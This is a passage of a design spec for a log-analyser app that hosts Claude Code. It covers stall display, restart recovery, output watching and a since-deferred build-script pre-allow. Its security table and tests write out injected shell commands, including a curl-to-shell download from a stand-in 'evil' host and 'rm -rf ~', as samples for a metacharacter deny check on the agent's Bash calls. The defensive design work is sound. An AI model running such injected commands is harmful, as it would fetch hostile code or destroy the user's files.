| `start(long request, SessionEvents.LocalAgentConsent consent)` | The `if (running())` branch no longer unconditionally no-ops. It inspects `phase`: `READY`/`BUSY` → unchanged behaviour **plus** one `note("ALREADY_RUNNING", …)`; `SPAWNING`/`HANDSHAKE`/`BINDING`/`STOPPING` → `kill(null, "RECOVERING")` (the existing `kill(String why, String noteStatus)` overload, `why=null` so no extra note duplicates `RECOVERING`'s) **then falls through to the existing `spawn(consent)` path**, unchanged — `sessionId`/`resumable` survive because `kill()` alone never touches them |
| `onExited` (`SessionEvents.LocalAgentExited`), the unrequested branch | `reason` gains the signal-decode branch of §3.4 before the existing `"Claude Code exited (code " + e.code() + ")"` fallback |
| The `RATE_LIMITED` case of the turn-outcome `switch` (§4.6 of M74) | Wording only: append the "does not block Start or Restart" clause (§3.4) |
| `StartActivityClockEffect` (Feature A, §4.1) | Requested one phase earlier: on `spawn()` setting `phase = "SPAWNING"`, not only on `LocalAgentTurnStarted` — so `currentStep`/`secondsSinceLastEvent` cover the handshake window too, per §3.4's table |
| New node field | `openTicketSendRef` (or the equivalent already-existing store reference for the ticket's own sent words, §4.5 of M74) is read, not duplicated, by a new `recoveryDraftRef` set exactly when an open ticket ends via `PROCESS_EXIT`, the Stop-deadline kill fallback, or the unrequested-exit branch — and consumed (cleared, and `SessionEffects.PlaceRecoveryDraftEffect` requested) the next time `beginConversation()` actually runs, never before |
| Effect (new) | `SessionEffects.PlaceRecoveryDraftEffect(long generation, long draftRef, String fixedLine)` — a sibling of the existing `PlacePendingDraftEffect`/`RecomposeLocalAgentDraftsEffect` family (§3 of M74's "First run" paragraph); its performer places the composed text, unsent, exactly as those already do |

### 4.4 Feature D

| Kind | Name | Carries | Home |
|---|---|---|---|
| Effect (new, replaces `WatchStarterGraphmlEffect`) | `SessionEffects.WatchProjectOutputsEffect` | `opId, projectGeneration, rootRef, java.util.List<String> declaredLogPathRefs` | Requested by the new node, on any project opening (never for the sample root or a bundle working copy — §2.8); the performer generalises `MainFrame.watchStarterGraphml`'s existing poll-and-diff loop (`GraphmlDiscovery.scan` + a `javax.swing.Timer`) to also poll the declared log paths and the current log's folder, and adds the stability check `§3.5`/`§6` needs (two consecutive polls, same size and mtime, before reporting) |
| Fact (new, replaces `StarterGraphmlAppeared`) | `SessionEvents.ProjectOutputChanged` | `projectGeneration, OutputKind kind (GRAPHML \| LOG), long pathRef, String shown, long atMillis, boolean duringAssistantTurn` | Adapter → the new node, raised only once a change clears the stability check (for `LOG`, immediately if the log's own `streamEnd` claims complete, else after the same stability window) |
| Node (new) | `ProjectOutputs` | Owns: the pending-offer state per kind, whether it is held for an open turn, and which paths the hosted assistant already opened this turn (read from `localAgentPermission`'s admitted-call facts, never duplicating that decision) | `session/node/ProjectOutputs.java`, a child of the session like `OnboardingProposal`/`LocalAgentPermission` |
| Effect (new) | `SessionEffects.OfferProjectOutputEffect` | `opId, OutputKind kind, long pathRef, String shown` | Requested once the node decides to show a banner (never mid-turn, §3.5); the performer renders the M78-style conditional banner, not a modal — retiring `MainFrame.askStarterGraph`'s `JOptionPane` |
| Fact (new) | `SessionEvents.ProjectOutputOfferAnswered` | `opId, boolean open` | The person's **Open**/**Not now** press → the node, which requests the existing `open {log, graphml}` pairing path on **Open** |
| `StarterProject` (changed) | consumes `ProjectOutputChanged` for its own first-build offer instead of requesting its own, now-retired watch | — | — |

Both new facts carry no words beyond a store reference (`pathRef`) and the already-redacted `shown` string the
existing `GraphmlDiscovery`/`FactWords.shown` pattern produces (§4.1 of M74) — unchanged discipline, nothing new to
justify here.

---

## 5. The context schema, additive

`context.project.assistant` (an existing section, `ContextSections.SECTIONS.get("project")` already lists
`assistant`) gains four read-only fields, all driven by `LocalAgentState` (rule 9 — the context reader renders the
same snapshot the panel does, never a second computation):

```json
{
  "assistant": {
    "phase": "BUSY",
    "currentStep": "Running ./mvnw package…",
    "secondsSinceLastEvent": 97,
    "approvalPending": false
  }
}
```

- **`phase`** — the existing `LocalAgentState.phase` enum (`OFF`, `SPAWNING`, `HANDSHAKE`, `BINDING`, `READY`,
  `BUSY`, …), newly surfaced here if not already; unchanged in meaning.
- **`currentStep`** — the same short, redacted phrase the activity line shows (§3.1's table), `""` when `phase` is
  not `BUSY`. Never a raw path or record text (§3.1).
- **`secondsSinceLastEvent`** — the integer the stall threshold compares against 60; always present while `BUSY`,
  `0` otherwise.
- **`approvalPending`** — boolean; true while `localAgentPermission` has a pending or queued request.

Feature B adds no context field: whether scripts are pre-allowed is a machine/session detail, not log or project
evidence, and belongs in *About this session…* and the FAQ, not in a surface an agent queries about the log under
analysis. (An agent cannot usefully ask "are my own Bash calls pre-allowed" through `context` in any case — it
would already know, because it is the one making the calls.)

Feature C adds no context field: `phase` already covers `SPAWNING`/`HANDSHAKE`/`BINDING`, and the recovery draft
is composer content, not evidence about the log.

Feature D adds one, additive, under `context.project` (not `assistant` — this is about the project's outputs, not
the assistant):

```json
{
  "pendingOutputOffers": ["graphml", "log"]
}
```

— present only while a `ProjectOutputOfferAnswered`-awaiting offer is showing for this project; an empty/absent
list otherwise. This lets an agent (or a test) see that a sync offer is waiting without parsing the banner's words;
it does not let an agent accept it (that stays the person's own click, §2.8).

`CustomerApiKeysTest` already pins the shape of the `assistant` key's neighbours in the released `project` section;
this is the test to extend with the four new field names so a future removal is caught (★, §7).

---

## 6. Security analysis — Feature B's abuse cases and mitigations

**The scope that bounds all of this.** Feature B operates **only inside the full posture**, which already grants
the person's own shell to Claude Code under the person's own permission rules and mode (§3 of M74, and its own
stated threat model: *"the analyser cannot narrow the full posture; it can only say so"*). Feature B does not
widen that grant. It removes a per-call dialog for a narrow, named, content-pinned set of invocations; the
marginal risk it adds is **"this exact, unchanged script runs without a click,"** never **"the person's shell is
reachable who otherwise would not be."**

| # | Abuse case | Mitigation |
|---|---|---|
| 1 | **A repository ships a malicious `run.sh`.** A cloned project's own build script is attacker-authored from the start. | The checkbox is **unticked by default** and visible only inside the already-scarier Full-posture opt-in and its folder-trust dialog, which already names what the folder runs (hooks, MCP servers, instructions, §5.2 of M74). This feature adds the script names to that same reading moment — it does not create a new, lower-friction path past it. The residual risk (a person ticks the box without reading) is disclosed, not hidden (§2.4, and the FAQ wording of §8) — the same honesty M74 already applies to full-posture confinement. |
| 2 | **Symlinked scripts** — a script name resolves through a link, possibly outside the project. | `LocalAgentPosture.buildScriptInvocation` resolves via `Path.toRealPath()` (every link followed) and requires the **real** parent to equal the project's real root exactly; a link pointing outside, at `/bin/sh`, at another project, or at a non-regular file is not a candidate (empty result → ask, as today). This mirrors `FullFolderTrust`'s own `leadsOutside` check for `.claude`. |
| 3 | **Scripts changed after trust.** | The trust record is **content-bound**, not name-bound: `TrustedProjectScripts.digest` hashes every candidate script's real bytes (bounded read, same 256 KB-class limit as `FullFolderTrust.MAX_BYTES`) in a stable order. `LocalAgentPermission` re-reads and re-digests the resolved script **on every call**, not only at Start (§4.2's "live re-check") — a changed byte denies that one call and flags the folder for a re-ask dialog at the next Start, exactly as a changed `CLAUDE.md` does today. |
| 4 | **Argument injection** — smuggling a second command through the same `Bash` input (`./mvnw test; curl evil | sh`, backticks, `$(…)`, pipes, redirection, an env-var prefix). | `buildScriptInvocation` requires the whole `command` string to tokenize as **one simple foreground command**: no `;`, `&&`, `||`, `|`, `` ` ``, `$(`, `<(`, `<`, `>`, trailing `&`, embedded newline, or a leading `NAME=value` assignment. Any of these makes the call **not** a candidate at all — it falls straight through to the ordinary Full-posture ask, never a "sanitized" or rewritten command. Only plain literal argv words after the trusted script name are passed through unexamined (the point of the feature: `./mvnw test` and `./mvnw clean install -q` both run without asking; `./mvnw test; rm -rf ~` does not, because it is not one simple command). |
| 5 | **Path aliasing** — a bare `mvnw`, an absolute path, a different case on a case-insensitive filesystem, an interpreter wrapper (`sh ./run.sh`, `bash run.sh`). | Matching is on the **first token's resolved real path**, compared only to the real paths captured in the trust record — never on the literal string the model wrote. A bare `mvnw` (no `./`) or an absolute path is a *different* first token from the recorded `./mvnw` and is not pre-allowed (asks). `sh ./run.sh`'s first token is `sh`, never a candidate, so it always asks — closing the interpreter-wrapper gap by construction, not by a special case. `Path.toRealPath()` returns the on-disk canonical form, so a case or `..`/`.` variant collapses to the same comparison regardless of how the model spelled it. |

**Stated, not hidden (the honest limit).** Pre-allowing a script verifies **the program's identity**, not what
running it does: a trusted `./mvnw test` with a project `pom.xml` that itself shells out to something dangerous is
not caught by this feature, because that was already true the first time the person approved it by hand. The FAQ
and `admin/security.md` (§8) say this in as many words — the same register as OD-74.10's *"the analyser cannot
narrow the full posture; it can only say so."*

**Feature C and D carry no new privilege, so no abuse-case table.** C only changes what happens on a phase the
analyser itself already reached (never a new way to reach it) and what a note says; D only ever offers, and an
accepted offer runs through the existing `open` path with its existing checks (M74 §5.6, M34's pairing) unchanged —
the watcher adds a fact, never a capability. D's one disclosed limit: the watcher reads file **names and
timestamps** only (`GraphmlDiscovery.scan`'s existing scope), never file contents, so it cannot itself tell a
regenerated graph from one rewritten with unrelated or malformed content — that judgement is `open`'s own, as it
already is today when the person opens a file by hand.

---

## 7. Tests (rule 8: ★ marks a test with a wrong-result witness)

### Feature A

| # | Test | Witness |
|---|---|---|
| ★ A1 | The step line shows **on tool start**, not on finish — a new frame/unit test asserting `currentStep` is non-empty immediately after `LocalAgentToolStarted`, before the matching `LocalAgentToolFinished` | revert to showing the line only after the tool result arrives |
| ★ A2 | The stall cue appears once `secondsSinceLastEvent` reaches 60 with the ticket still open, and **not** at 59 | change the threshold, or fire it from a UI-side `javax.swing.Timer` instead of the node's tick |
| ★ A3 | **No stall cue while `approvalPending` is true**, however long `secondsSinceLastEvent` runs | drop the `approvalPending` guard |
| A4 | **Keep waiting** dismisses the current episode only; a further 60 s of silence in the *same* episode re-shows nothing more until a *new* episode (an intervening event) starts, then runs another 60 s | — |
| A5 | Approval status offers no blocked Show action; a native composer click remains blocked by the existing application-modal question. Repeating its existing show effect raises the same dialog, never a duplicate (OD-81.11) | — |
| A6 | `context.project.assistant` carries `phase`, `currentStep`, `secondsSinceLastEvent`, `approvalPending`, each matching the panel's own `Guide` fields for the same snapshot | — |
| A7 | *About this session…* shows `N tool calls · M turns`, incrementing exactly once per `LocalAgentToolStarted`/`LocalAgentTurnStarted`, reset by New chat | — |
| ★ A8 | `AssistantChromeBudgetFrameTest` (extended): the "a turn running" state's word count, **Stop plus the activity line**, stays at or under the already-pinned ≤15-word budget (§3.6 arithmetic: Stop is 1 word; the step text plus its clock is capped at 10 words, leaving headroom) | let the step text grow unbounded, or raise the pinned ≤15 ceiling instead of capping the new line |
| A9 | `OneDispatchModelTest`: no literal step words, no stall threshold, no episode logic in panel classes — all of it is `localAgentSession`'s | — |

### Feature B

| # | Test | Witness |
|---|---|---|
| ★ B1 | An allowed script (`./mvnw test`) runs **unasked** only when the checkbox was ticked for this project, in Full, in a mode that otherwise asks | run it unasked with the box unticked |
| ★ B2 | An **unticked** project (candidates exist, box left unticked) asks for `./mvnw test` exactly as today | pre-allow it anyway |
| ★ B3 | **Another command** (`./deploy.sh`, not a candidate; or `./mvnw test; echo pwned`) always asks, never pre-allowed | widen the match to any script in the folder, or to any `Bash` call once one script is trusted |
| ★ B4 | A trusted script **changed after trust** (one byte flipped) is denied pre-allow on the very next call, in the same running session, and the next Start/Send shows the re-ask dialog | compare only the recorded name, not current content |
| ★ B5 | A trusted script name resolving through a **symlink pointing outside** the project root is never pre-allowed, in a fresh session (no stale cache) | follow the symlink's apparent name instead of its real target |
| B6 | **Safe analysis is unchanged**: the checkbox never appears, and `Bash` is denied outright regardless of any trust record | — |
| ★ B7 | A profile, project-profile share, or evidence bundle containing an `assistant.claudeCode.trustedScripts` entry is refused to carry it — extends the existing ★ consent test (`spec-claude-code-provider.md` §10) that already pins `trustedFull`/`trusted` as machine-tier only | let a shared settings file or bundle smuggle the grant into a different machine |
| B8 | Argument-injection forms (`;`, `&&`, `||`, `|`, backtick, `$(`, `<(`, redirection, a leading env assignment, an embedded newline) each fall through to the ordinary ask path, individually tested | — |
| B9 | **External REST clients are unchanged**: the pre-allow applies only to the hosted Claude Code process's own `Bash` calls, never to an external caller of the action socket | — |
| B10 | `FaqSecurityContractTest` (extended) pins the new FAQ/`admin/security.md` wording, including the "verifies identity, not effect" disclosure of §6 | — |

### Feature C

| # | Test | Witness |
|---|---|---|
| ★ C1 | A session stuck in `HANDSHAKE` (a fake adapter that never completes `initialize`), then Restart: the old generation is killed (`StopLocalAgentEffect`) and a new one spawns | the existing silent `answer(request, true, "")` no-op, with no kill and no new spawn |
| ★ C2 | Restart after an **external** SIGTERM-style exit resumes the **same** `sessionId`, with `resumable` still true | `beginConversation()` called on this path, clearing `resumable` |
| C3 | A resume that is impossible (posture/folder changed) refuses plainly, then starts a new chat **with the recovery draft placed**, composer unsent | — |
| C4 | The `RATE_LIMITED` note's wording includes "does not block Start or Restart", and a Start/New chat succeeds normally while it is the latest note | — |
| ★ C5 | The 35 s start-deadline `TIMEOUT` verdict renders with its own distinct banner/wording, never merged with `EXITED` or `ALREADY_RUNNING` | collapse `TIMEOUT`'s wording into the generic exited banner |
| C6 | Restart while `READY`/`BUSY` appends the `ALREADY_RUNNING` note and changes nothing else (no kill, no new generation) | — |

### Feature D

| # | Test | Witness |
|---|---|---|
| ★ D1 | A regenerated GraphML in an **open, person-owned project** produces exactly one `ProjectOutputChanged`/offer, after the debounce window, for a file written in one burst then left alone | fire on the first observed mtime change, pre-debounce |
| D2 | A new audit log produces a `LOG` offer; accepting pairs it with the regenerated graph through the existing pairing path | — |
| ★ D3 | **The sample project and a bundle's working copy get no offer and no watch is even requested for them** | request `WatchProjectOutputsEffect` for an analyser-owned scratch root |
| ★ D4 | A **partial** file (still growing: mtime advancing between polls, or a log with no `streamEnd` claim and ongoing growth) produces **no** offer until it is stable | report on the first write, or on a size increase alone without the second confirming poll |
| ★ D5 | The person's own **open** log is never replaced without their **Open** click — a background `ProjectOutputChanged` for a different log never switches it | auto-switch on the fact alone |
| D6 | The starter's first-build offer still appears, now sourced from `ProjectOutputChanged` through the generalised watch, not its own retired effect | — |
| D7 | A change produced by the hosted assistant's own open turn holds its offer until `LocalAgentTurnEnded`; if Full already opened that exact path under the existing in-project pre-allow, the offer for it never appears at all | show the banner mid-turn, or show it again for a path already opened |
| D8 | `context.project.pendingOutputOffers` names exactly the kinds with a live, unanswered offer, and clears on **Open** or **Not now** | — |

---

## 8. PR phasing, owner decisions, and open questions

### 8.1 Phasing

**r5 disposition supersedes B delivery:** its draft is closed unmerged; this documentation-only disposition
does not carry B production code. The D branch depends on safe C/A and the working-folder prerequisite, not B.
The original four-group plan below is preserved as history, not a direction to ship the deferred exception.

The owner requests four PRs, **C, A, B, D**, each against main, with stack dependencies documented. The rows below
are implementation phases within those PRs, in order; C1/C2 are one C PR, A1–A3 one A PR, B1–B4 one B PR,
and D1/D2 one D PR. Each delivery is a reviewed feature branch with its CHANGELOG line (rule 2) and green tests (rule 4). **Feature C
ships first** — it is a fix for a live defect (a swallowed Restart, a lost conversation), not a new surface, and
every other PR benefits from the activity-clock extension it needs.

| Phase | Size | Content |
|---|---|---|
| **C1** | S | `start()`'s phase-aware branch (kill-then-spawn for a stuck phase, the `ALREADY_RUNNING` note for a healthy one); the signal-decode exit wording; the `RATE_LIMITED` wording clause. C1, C2, C4, C6 |
| **C2** | M | `recoveryDraftRef`, `PlaceRecoveryDraftEffect`, the resume-impossible plain refusal + automatic new-chat-with-draft fallback; extends `StartActivityClockEffect` to the `SPAWNING`/`HANDSHAKE`/`BINDING` window (feeds A2's rendering once it lands). C3, C5 |
| **A1** | S | `LocalAgentToolStarted`/`Finished`/`ActivityTick`/`Acknowledged` facts; `StartActivityClockEffect`; `lastEventAtMillis`, `currentStep`, the silence-episode state and the running totals in `localAgentSession`; the `Guide`/`LocalAgentState` field additions. Unit/node-level tests only (A1–A4, A6, A7, A9) |
| **A2** | M | Panel rendering: the conditional activity line, the stall banner (**Keep waiting**/**Stop**), truthful modal "needs your approval" status (no blocked Show control, OD-81.11), the *About* totals line. `AssistantChromeBudgetFrameTest` extension (★ A8), A5 |
| **A3** | S | Redaction rules for `Read`/`Bash` step words (reusing `FactWords`), the verb-name table for hosted steps, docs (*About*, FAQ mention) |
| **B1** | S | `TrustedProjectScripts` (candidates/digest/record/confirms/changeNote); `LocalAgentPosture.buildScriptInvocation` and its tokenizer (the single-simple-command check, §6); unit tests for B8 and the real-path/symlink checks of B5 |
| **B2** | M | The dialog checkbox and its wording (§3.2); `assistant.claudeCode.trustedScripts` in `ConfigStore`/`LocalAgentConsents`; the re-ask note; *About*'s trusted/not-trusted line and **Revoke** |
| **B3** | M | `LocalAgentAdapter.builtInKind`'s new branch; `LocalAgentPermission.onRequested`'s new branch with the live re-check (§4.2); B1–B4, B6, B9 |
| **B4** | S | FAQ security answer, `admin/security.md`, `FaqSecurityContractTest` extension (B10); CHANGELOG lines for both features; the README index row and tracker item this PR already carries |
| **D1** | S | `WatchProjectOutputsEffect` (generalising `MainFrame.watchStarterGraphml`'s poll-and-diff loop to any open project, plus the stability check), `ProjectOutputChanged`, the new `ProjectOutputs` node's pending-offer/held-for-turn state. D1, D3, D4 |
| **D2** | M | `OfferProjectOutputEffect`'s banner (retiring `askStarterGraph`'s modal), `ProjectOutputOfferAnswered`, the pairing-on-accept wiring, `StarterProject` migrated to consume `ProjectOutputChanged` (its own watch retired), `context.project.pendingOutputOffers`. D2, D5, D6, D7, D8 |

### 8.2 Owner decisions

| # | Decision | Status |
|---|---|---|
| **OD-81.1** | **Feature A's rule-9 split.** The adapter reports tool-start, tool-finish and text-delta as facts; `localAgentSession` owns `lastEventAtMillis`, `currentStep`, the stall/episode verdict and the running totals; the panel renders only. Elapsed time is always derived from fact timestamps plus a node-requested `StartActivityClockEffect` tick — never a panel-owned clock (§4.1). | accepted (owner, 2026-10-19) |
| **OD-81.2** | **The stall threshold and its suppression.** ~60 s with no stream event, suppressed outright (not merely delayed) while an approval is pending or queued; dismissal lasts for the current silence episode, with no timed repetition; only a new stream event rearms the cue
followed by a further 60 s of silence (§3.1, §4.1). | accepted (owner, 2026-10-19) |
| **OD-81.3** | **A narrow, recorded exception to `spec-claude-code-provider.md` §5.7's "no Always allow."** That rule continues to hold for every tool and every call it was written about: there is still no model-suggested or CLI-applied "always allow" (`permission_suggestions`/`updatedPermissions` are still never sent, §5.7). The one exception this spec adds is a **person-chosen, per-machine, per-project, content-pinned** pre-allow of exactly `Bash` invocations of the project's own named build scripts, decided **only** by the analyser's own permission layer, in the Full posture, never by a CLI rule. §5.7's rule is amended to read: *"no Always allow, except the named, content-bound build-script exception of M81."* | accepted (owner, 2026-10-19) — supersedes §5.7 in scope only |
| **OD-81.4** | **Mechanism: the analyser's permission layer, not `--allowedTools`.** Justified by the shipped `WebFetch`/`docsFetch` precedent and the 1.36.0 P2 finding that a CLI allow rule bypasses the analyser's own, stricter checks (real path, symlink target, argument syntax) — exactly the failure mode a hostname-only `WebFetch` allow already produced once. `ClaudeCodeProvider`'s command line is **not** changed to add `Bash` to `--allowedTools`; the person's own permission rules and mode still apply unchanged underneath, as they do for every other full-posture call. | accepted (owner, 2026-10-19) |
| **OD-81.5** | **One checkbox, trusting the whole discovered set together; sourced from `commandsFor` and the first-run record; machine-tier, keyed by the project's real path; never in a profile, share or bundle** (§3.2, §3.3, §4.2). | accepted (owner, 2026-10-19) |
| **OD-81.6** | **Revocation narrows live; re-granting goes back through the folder-trust dialog.** Revoking in *About* takes effect for the very next call, no restart (narrowing a consent is always safe to apply mid-session, unlike widening, which still needs New chat per M74 §3). There is no separate Settings-page toggle in this delivery (§2.4). | accepted (owner, 2026-10-19) |
| **OD-81.7** | **Restart's three outcomes, named.** A stuck phase is recovered by `kill()` alone (never `beginConversation()`), preserving `sessionId`/`resumable`; a healthy session gets an `ALREADY_RUNNING` note instead of silence; an impossible resume refuses plainly and falls back to a new chat with the recovery draft placed, never sent (§3.4, §4.3). | accepted (owner, 2026-10-19) |
| **OD-81.8** | **Exit and limit wording are honest, not merely present.** An externally caused exit names itself as such when the code decodes to a known signal; the usage-limit note states plainly that it does not block Start; a genuine limit-caused start failure is a refusal, worded distinctly from the advisory note (§3.4). | accepted (owner, 2026-10-19) |
| **OD-81.9** | **The starter's one-shot GraphML watch is generalised into an ongoing, per-open-project watch of both GraphML and log outputs, retiring `WatchStarterGraphmlEffect`/`StarterGraphmlAppeared` in favour of `WatchProjectOutputsEffect`/`ProjectOutputChanged`; the starter's own offer becomes a consumer of the general fact, not a second watcher** (§1.5, §4.4, D6). | accepted (owner, 2026-10-19) |
| **OD-81.10** | **Sync offers are banners, never modals; offer, never act.** Accepting pairs through the existing path; declining or ignoring changes nothing; the person's own open log is never auto-switched (§2.7, §3.5). | accepted (owner, 2026-10-19) |

| **OD-81.11** | **Truthful modal approval presentation.** Preserve existing application-modal approvals. Do not imply that a composer Show action is clickable while blocked. Test truthful status and native interaction; supersedes the original A5 Show affordance, not the permission policy. | accepted (owner, 2026-10-19) |
| **OD-81.12** | Both root-reset and no-background safeguards were authorised only for explicitly opted-in Full script-trusting sessions, with no running-session retrofit. A bounded per-call helper investigation was subsequently authorised, not a self-report acceptance claim or execution proxy. | historical authorisation; implementation withheld by OD-81.13 |
| **OD-81.13** | **Defer B, close #184 unmerged and preserve its evidence/WIP.** The absolute-path-only alternative was assessed read-only before implementation and does not close documented wrapper, shell-prelude or auto-background gaps. Do not ship pre-approval. Any future broader build consent, explicitly including assistant-edited build inputs, requires a separate design/security review. D proceeds without B. | explicitly confirmed by owner, 2026-10-19; supersedes B delivery/OD-81.3–6 in this milestone |

### 8.3 Open questions

- **OQ-1 (Windows) — answered, owner 2026-10-19.** Ship POSIX-only B first; do not wait for unscheduled
  Windows acceptance #148. On Windows, offer no script-trust checkbox and ask for scripts exactly as today.
  Link #148 from FAQ/security disclosure. No Windows pre-allow is claimed.
- **OQ-2 (stall repetition) — answered, owner 2026-10-19.** No timed repetition after Keep waiting. Elapsed time
  keeps counting; only a new stream event rearms the notice, then a further 60 s of silence. This supersedes r3's
  contradictory repeating-banner sentence and OD-81.2 wording; A4 already described the chosen behaviour.
- **OQ-3 (script choice) — confirmed, owner 2026-10-19.** One unticked whole-set checkbox, with each script
  individually bound to its real path and digest. Changed or newly added scripts ask; a name alone never grants.
- **OQ-4 (real CLI heartbeat) — technical evidence checked, not a live probe.** Current official streaming docs
  describe API ping events and complete tool-use blocks arriving before execution. The official Python SDK also
  defines task-progress messages. Neither establishes a guaranteed whole-session heartbeat during quiet Bash;
  the existing analyser parser recognises keep_alive but shipped sanitised fixtures do not demonstrate cadence.
  Retain the node-requested synthetic elapsed clock, observe actual stream progress where received, and never
  represent a synthetic tick as proof that the CLI is alive. No live CLI/model is run under the stub-only constraint.
  Sources: [streaming output](https://code.claude.com/docs/en/agent-sdk/streaming-output),
  [official SDK parser](https://github.com/anthropics/claude-agent-sdk-python/blob/main/src/claude_agent_sdk/_internal/message_parser.py).
- **OQ-5 (default posture) — unchanged scope.** Safe/default gets no script checkbox or pre-allow; external
  REST clients are unchanged.
- **OQ-6 (signal vocabulary) — narrow v1.** C decodes required TERM/15 and KILL/9 only. Public CLI 2.1.282
  wrapper source maps child signals to 128 + signum. No Windows/other-signal vocabulary is claimed without a probe.
- **OQ-7 (watch cadence) — confirmed, owner 2026-10-19.** Retain four-second polling and stability interval.
- **OQ-8 (exchange off) — confirmed, owner 2026-10-19.** Explicitly accepted local output offers may open via
  the existing local read/pairing path while file exchange is off. This never authorises automatic log switching.

---

## Revision history

- **2026-10-19, DRAFT r1**: written against the live `origin/main` code (M74 `spec-claude-code-provider.md`
  DRAFT r16, M78 `spec-quiet-assistant-panel.md` ACCEPTED) for two owner-approved features of the same day.
- **2026-10-19, DRAFT r2**: added Feature C (a restart that always works and keeps the conversation), from an
  investigation of release 1.36.0's `LocalAgentSession.start()`/`onExited`/`RATE_LIMITED` behaviour.
- **2026-10-19, DRAFT r3**: added Feature D (the analyser stays in sync with the project), generalising the
  starter's one-shot GraphML watch into an ongoing watch of any open project's graph and log outputs.

- **2026-10-19, DRAFT r4**: recorded owner answers OQ-1/2/3/7/8; no timed stall repetition, POSIX-first B,
  per-script content binding within the single set choice, four-second watcher, and explicit local accepts with
  exchange off. Recorded heartbeat evidence limits, narrow signal vocabulary, and the four-PR delivery grouping.
  Subsequently recorded OD-81.11: keep modal approval and remove the blocked composer Show affordance.

- **2026-10-19, DRAFT r5**: recorded explicit B deferral after the bounded helper investigation and the owner's
  read-only absolute-path assessment; preserved the historical proposal and existing effect-risk disclosure;
  recorded the separate-review boundary for any future broader consent. D proceeds without unsafe B ancestry.

